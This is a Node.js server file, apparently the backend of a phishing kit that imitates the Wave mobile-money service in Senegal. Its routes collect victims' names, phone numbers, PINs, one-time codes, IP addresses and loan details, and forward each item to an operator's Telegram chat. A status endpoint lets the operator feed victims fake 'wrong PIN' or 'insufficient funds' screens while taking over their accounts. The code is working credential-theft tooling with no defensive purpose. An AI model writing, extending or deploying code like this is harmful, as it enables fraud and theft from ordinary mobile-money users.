// ─────────────────────────────────────────────────────────────────
//  Wave Smart Backend — server.js
//  Receives login attempts from the frontend, stores sessions,
//  and fires Telegram bot alerts for every key event.
// ─────────────────────────────────────────────────────────────────

require('dotenv').config();
const express  = require('express');
const cors     = require('cors');
const fetch    = require('node-fetch');
const { v4: uuidv4 } = require('uuid');

const app  = express();
const PORT = process.env.PORT || 3000;

// ── Config ────────────────────────────────────────────────────────
const BOT_TOKEN  = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID    = process.env.TELEGRAM_CHAT_ID;
const TG_API     = `https://api.telegram.org/bot${BOT_TOKEN}`;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error('❌  Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in .env');
  process.exit(1);
}

// ── Middleware ────────────────────────────────────────────────────
app.use(cors({ origin: process.env.FRONTEND_ORIGIN || '*' }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ── In-memory session store ───────────────────────────────────────
// Structure: { [sessionId]: { phone, pin, firstName, lastName, otp, status, createdAt } }
const sessions = {};

// Clean up sessions older than 30 minutes every 10 minutes
setInterval(() => {
  const cutoff = Date.now() - 30 * 60 * 1000;
  for (const [id, s] of Object.entries(sessions)) {
    if (s.createdAt < cutoff) delete sessions[id];
  }
}, 10 * 60 * 1000);

// ── Telegram helpers ──────────────────────────────────────────────

/**
 * Send a Telegram message. Uses MarkdownV2 for formatting.
 * Special chars are escaped automatically.
 */
async function tgSend(text) {
  try {
    const res = await fetch(`${TG_API}/sendMessage`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id:    CHAT_ID,
        text:       text,
        parse_mode: 'HTML',
      }),
    });
    const data = await res.json();
    if (!data.ok) {
      console.error('Telegram error:', data.description);
    }
    return data;
  } catch (err) {
    console.error('Telegram fetch error:', err.message);
  }
}

/** Format current timestamp as a readable string */
function now() {
  return new Date().toLocaleString('fr-FR', {
    timeZone: 'Africa/Dakar',
    dateStyle: 'short',
    timeStyle: 'medium',
  });
}

/** Get rough flag emoji for country code */
function flag(phone) {
  // Senegal numbers start with 7 after +221
  return '🇸🇳';
}

// ── Routes ────────────────────────────────────────────────────────

/** Health check */
app.get('/', (req, res) => {
  res.json({ status: 'ok', service: 'Wave Smart Backend', time: new Date().toISOString() });
});

/**
 * POST /api
 * Unified action endpoint — mirrors the original API contract.
 * Actions: login_attempt | otp_entered | loan_application
 */
app.post('/api', async (req, res) => {
  const { action, ...data } = req.body;

  switch (action) {

    // ── 1. Login attempt: phone + PIN entered ──────────────────────
    case 'login_attempt': {
      const { firstName = 'Unknown', lastName = 'User', phone, pin } = data;
      const sessionId = uuidv4();
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';

      sessions[sessionId] = {
        firstName, lastName, phone, pin,
        status:    'pending',
        createdAt: Date.now(),
        ip,
      };

      console.log(`[LOGIN]  ${firstName} ${lastName}  |  +221${phone}  |  PIN: ${pin}  |  Session: ${sessionId}`);

      // 🔔 Telegram alert
      await tgSend(
        `🔐 <b>New Login Attempt</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${firstName} ${lastName}\n` +
        `📱 <b>Phone:</b> ${flag(phone)} +221 ${phone}\n` +
        `🔑 <b>PIN:</b> <code>${pin}</code>\n` +
        `🕐 <b>Time:</b> ${now()}\n` +
        `🌐 <b>IP:</b> <code>${ip}</code>\n` +
        `🆔 <b>Session:</b> <code>${sessionId.slice(0, 8)}…</code>`
      );

      return res.json({ success: true, data: { sessionId } });
    }

    // ── 2. OTP entered ────────────────────────────────────────────
    case 'otp_entered': {
      const { sessionId, otp } = data;
      const session = sessions[sessionId];

      if (!session) {
        return res.json({ success: false, error: 'Session not found' });
      }

      session.otp = otp;
      session.otpAt = Date.now();

      console.log(`[OTP]    Session: ${sessionId}  |  OTP: ${otp}`);

      // 🔔 Telegram alert
      await tgSend(
        `📟 <b>OTP Code Received</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
        `📱 <b>Phone:</b> ${flag(session.phone)} +221 ${session.phone}\n` +
        `🔑 <b>PIN:</b> <code>${session.pin}</code>\n` +
        `📟 <b>OTP:</b> <code>${otp}</code>\n` +
        `🕐 <b>Time:</b> ${now()}\n` +
        `🆔 <b>Session:</b> <code>${sessionId.slice(0, 8)}…</code>`
      );

      return res.json({ success: true });
    }

    // ── 3. Loan application submitted ────────────────────────────
    case 'loan_application': {
      const { firstName, lastName, phone, amount, duration, income, monthly } = data;
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';

      console.log(`[LOAN]   ${firstName} ${lastName}  |  ${amount} FCFA  |  ${duration} months`);

      // 🔔 Telegram alert
      await tgSend(
        `💰 <b>Loan Application</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${firstName} ${lastName}\n` +
        `📱 <b>Phone:</b> ${flag(phone)} +221 ${phone}\n` +
        `💵 <b>Amount:</b> ${Number(amount).toLocaleString('fr-FR')} FCFA\n` +
        `📅 <b>Duration:</b> ${duration} months\n` +
        `💼 <b>Income:</b> ${Number(income).toLocaleString('fr-FR')} FCFA/mo\n` +
        `📊 <b>Monthly:</b> ${Number(monthly).toLocaleString('fr-FR')} FCFA\n` +
        `🕐 <b>Time:</b> ${now()}\n` +
        `🌐 <b>IP:</b> <code>${ip}</code>`
      );

      return res.json({ success: true });
    }

    default:
      return res.status(400).json({ success: false, error: `Unknown action: ${action}` });
  }
});

/**
 * GET /api?action=check_status&sessionId=...
 * Returns current session status — used by the frontend to poll
 * after a login attempt. You can update session.status from your
 * Telegram bot using the /api/set_status endpoint below.
 */
app.get('/api', (req, res) => {
  const { action, sessionId } = req.query;

  if (action === 'check_status') {
    const session = sessions[sessionId];
    if (!session) return res.json({ success: false, error: 'Session not found' });
    return res.json({ success: true, status: session.status });
  }

  res.status(400).json({ success: false, error: 'Unknown action' });
});

/**
 * POST /api/set_status
 * Allows your Telegram bot (or any webhook) to update the status
 * of a session. The frontend polls check_status and reacts to:
 *   approved   → proceeds to OTP screen
 *   wrong_pin  → shows error, clears PIN
 *   wrong_code → shows error, clears OTP
 *   continue   → shows "insufficient funds" message
 *
 * Body: { sessionId, status, secret }
 * The `secret` must match ADMIN_SECRET in .env for security.
 */
app.post('/api/set_status', (req, res) => {
  const { sessionId, status, secret } = req.body;
  const ADMIN_SECRET = process.env.ADMIN_SECRET || 'wavesmart2026';

  if (secret !== ADMIN_SECRET) {
    return res.status(403).json({ success: false, error: 'Forbidden' });
  }

  const validStatuses = ['pending', 'approved', 'wrong_pin', 'wrong_code', 'continue'];
  if (!validStatuses.includes(status)) {
    return res.status(400).json({ success: false, error: `Invalid status. Use: ${validStatuses.join(', ')}` });
  }

  const session = sessions[sessionId];
  if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

  session.status = status;
  console.log(`[STATUS] Session ${sessionId.slice(0, 8)} → ${status}`);

  return res.json({ success: true, sessionId, status });
});

/**
 * GET /api/sessions
 * Lists all active sessions (admin use only, protect in production).
 */
app.get('/api/sessions', (req, res) => {
  const secret = req.query.secret || req.headers['x-admin-secret'];
  const ADMIN_SECRET = process.env.ADMIN_SECRET || 'wavesmart2026';

  if (secret !== ADMIN_SECRET) {
    return res.status(403).json({ success: false, error: 'Forbidden' });
  }

  const list = Object.entries(sessions).map(([id, s]) => ({
    sessionId:  id,
    firstName:  s.firstName,
    lastName:   s.lastName,
    phone:      s.phone,
    pin:        s.pin,
    otp:        s.otp || null,
    status:     s.status,
    ip:         s.ip,
    createdAt:  new Date(s.createdAt).toISOString(),
  }));

  res.json({ success: true, count: list.length, sessions: list });
});

// ── Start server ──────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`\n🚀  Wave Smart Backend running on port ${PORT}`);
  console.log(`📡  Telegram bot alerts → Chat ID: ${CHAT_ID}`);
  console.log(`🔗  API: http://localhost:${PORT}/api\n`);

  // Send startup notification to Telegram
  tgSend(
    `✅ <b>Wave Smart Backend Started</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `🕐 <b>Time:</b> ${now()}\n` +
    `🌐 <b>Port:</b> ${PORT}\n` +
    `📡 Ready to receive login alerts`
  );
});

module.exports = app;
